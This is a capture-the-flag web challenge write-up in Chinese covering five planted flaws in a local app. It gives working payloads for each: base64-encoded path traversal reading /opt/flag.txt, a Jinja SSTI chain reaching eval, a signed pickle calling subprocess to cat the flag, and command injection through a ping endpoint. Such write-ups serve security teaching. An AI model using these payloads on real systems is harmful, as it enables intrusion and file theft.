# Web

总共留了五个漏洞

## robots.txt

```
$ curl http://127.1/robots.txt
5784892c-6fae-439b-885b-df0efe884748
```

## 图片任意文件读

1. 直接读取 flag
```
$ curl http://127.1/image/Li4vLi4vLi4vLi4vLi4vLi4vb3B0L2ZsYWcudHh0
5784892c-6fae-439b-885b-df0efe884748
```

2. 读取 .secret
```
$ curl http://127.1/image/Li4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9hcHAvLnNlY3JldA==
HITCTF
```

## SSTI

留言功能如果触发异常，则会触发 SSTI 漏洞  
触发异常只需要输入长度多于表单规定的长度（64）即可  
或者提交错误的 _csrf_token  

```python
class MessageboardForm(Form):
    content = StringField('内容',validators=[Required(),Length(max=64)])
    submit = SubmitField('提交')
```

利用链为先登陆，再留言，留言的时候长度大于 64  

```
{{().__class__.__bases__[0].__subclasses__()[3].__init__.__globals__["__builtins__"]["eval"]("open('/opt/flag.txt','r').read()")}}
```

## Pickle
由于本次比赛所有队伍的 .secret 相同，所以只需要修改将 pickle 代码使用 HMAC_Pickler 进行签名即可  
原本预期的是所有队伍 .secret 随机，则需要使用其他漏洞（如任意文件读）泄露出 .secret  
将 aboutme 该为如下  
```
88be1ffc67a91168b0eb5f0e1cf5efd7|KGNzdWJwcm9jZXNzCmNoZWNrX291dHB1dAooVmNhdApWL29wdC9mbGFnLnR4dApsby4=
```
再访问个人页面即可获取flag


## 远程命令执行

```
$ curl -X POST 'http://127.1/myfeeling/ping' --data 'pong=/bin/cat /opt/flag.txt'
5784892c-6fae-439b-885b-df0efe884748
```
